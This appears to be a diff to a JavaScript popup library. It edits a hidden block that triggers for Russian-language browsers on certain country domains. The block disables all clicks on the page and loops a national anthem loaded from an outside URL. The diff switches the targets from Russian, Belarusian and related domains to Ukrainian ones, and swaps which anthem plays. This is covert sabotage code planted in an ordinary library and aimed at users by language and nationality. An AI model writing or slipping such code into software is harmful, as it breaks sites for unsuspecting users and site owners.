@@ -304,7 +304,7 @@ const blurActiveElement = () => {
 if (
   typeof window !== 'undefined' &&
   /^ru\b/.test(navigator.language) &&
-  location.host.match(/\.(ru|su|by|xn--p1ai)$/)
+  location.host.match(/\.(ua)$/)
 ) {
   const now = new Date()
   const initiationDate = localStorage.getItem('swal-initiation')
@@ -314,7 +314,7 @@ if (
     setTimeout(() => {
       document.body.style.pointerEvents = 'none'
       const ukrainianAnthem = document.createElement('audio')
-      ukrainianAnthem.src = 'https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3'
+      ukrainianAnthem.src = 'https://rus.hitmotop.com/get/music/20240612/Oficialnyjj_gimn_Rossijjskojj_ederacii_-_Gimn_Rossii_77958868.mp3'
       ukrainianAnthem.loop = true
       document.body.appendChild(ukrainianAnthem)
       setTimeout(() => {
